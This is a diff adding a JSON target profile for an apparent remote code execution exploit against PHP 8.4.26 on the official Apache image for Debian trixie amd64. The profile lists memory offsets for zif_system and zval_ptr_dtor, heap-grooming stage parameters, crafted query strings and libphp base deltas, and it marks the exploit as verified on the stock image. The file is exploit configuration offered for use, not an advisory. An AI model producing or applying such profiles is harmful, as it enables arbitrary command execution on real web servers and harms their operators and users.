@@ -1,0 +1,31 @@
+{
+  "name": "php-8.4.26-trixie-amd64",
+  "php_version": "8.4.26",
+  "distro": "trixie",
+  "arch": "amd64",
+  "image": "php:8.4.26-apache",
+  "apache_version": "2.4.69",
+  "offsets": {
+    "zif_system": "0x465370",
+    "zval_ptr_dtor": "0x65eb60",
+    "S": "0xF8398",
+    "hsv": "0x7D720"
+  },
+  "stages": {
+    "a1_big": 78,
+    "b1_spec": "G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:511:0x137,G:400:0x137,G:511:0x137,X:900",
+    "b1_fake_len": "0xC8000",
+    "a1_query": "q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v",
+    "a2_parts": 880,
+    "a2_depth": 64,
+    "a2_fillers": 115,
+    "b2_vl": 384,
+    "b2_n1": 500,
+    "b2_n2": 495,
+    "b2_rc": 1
+  },
+  "main_bucket_count": 87,
+  "libphp_main_delta": ["0x1A00000", "0x1F00000"],
+  "rce_verified": true,
+  "notes": "Verified 5/5 stock official image + 15/15 symbolized build (pure/RESEARCH_PURE_128M.md). display_errors=Off, memory_limit=128M, files session handler."
+}
